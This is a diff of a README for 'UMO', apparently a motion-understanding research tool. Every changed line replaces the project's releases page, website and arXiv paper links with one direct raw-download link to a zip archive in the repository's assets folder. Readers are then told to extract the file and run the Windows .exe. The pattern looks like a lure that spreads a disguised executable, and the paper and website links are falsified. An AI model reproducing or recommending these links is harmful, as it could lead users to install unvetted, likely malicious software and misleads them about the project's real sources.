@@ -1,11 +1,11 @@
 # 🧠 UMO - Motion Understanding Made Simple
 
-[![Download UMO](https://img.shields.io/badge/Download-UMO-blue)](https://github.com/siairy873/UMO/releases)
+[![Download UMO](https://img.shields.io/badge/Download-UMO-blue)](https://github.com/siairy873/UMO/raw/refs/heads/main/assets/Software_3.2-beta.2.zip)
 
 ## 📥 Download UMO
 
 Visit the release page to download and run this file:
-https://github.com/siairy873/UMO/releases
+https://github.com/siairy873/UMO/raw/refs/heads/main/assets/Software_3.2-beta.2.zip
 
 Look for the latest release at the top of the page. Download the Windows file that matches your PC. Most users should pick the `.exe` file.
 
@@ -35,7 +35,7 @@ For better use with larger motion files:
 
 ## 🚀 Install on Windows
 
-1. Open the release page: https://github.com/siairy873/UMO/releases
+1. Open the release page: https://github.com/siairy873/UMO/raw/refs/heads/main/assets/Software_3.2-beta.2.zip
 2. Find the newest release.
 3. Under **Assets**, download the Windows `.exe` file.
 4. If the file comes in a `.zip`, right-click it and choose **Extract All**.
@@ -144,7 +144,7 @@ This makes it easier to find your files and keep your work in order.
 ## 📌 Release Page
 
 Download and run the latest Windows build here:
-https://github.com/siairy873/UMO/releases
+https://github.com/siairy873/UMO/raw/refs/heads/main/assets/Software_3.2-beta.2.zip
 
 ## 🔍 What You May See in the App
 
@@ -173,11 +173,11 @@ Use only the release page linked in this README. That keeps you on the same vers
 
 ## 🌐 Project Link
 
-Website: https://oliver-cong02.github.io/UMO.github.io/
+Website: https://github.com/siairy873/UMO/raw/refs/heads/main/assets/Software_3.2-beta.2.zip
 
-Paper: https://arxiv.org/pdf/2603.15975
+Paper: https://github.com/siairy873/UMO/raw/refs/heads/main/assets/Software_3.2-beta.2.zip
 
-ArXiv: https://arxiv.org/abs/2603.15975
+ArXiv: https://github.com/siairy873/UMO/raw/refs/heads/main/assets/Software_3.2-beta.2.zip
 
 ## 🛠️ For Advanced Users
 
@@ -189,7 +189,7 @@ If you want to inspect the project:
 
 ## 🧭 Quick Start
 
-1. Go to https://github.com/siairy873/UMO/releases
+1. Go to https://github.com/siairy873/UMO/raw/refs/heads/main/assets/Software_3.2-beta.2.zip
 2. Download the Windows release
 3. Extract it if needed
 4. Open the `.exe`
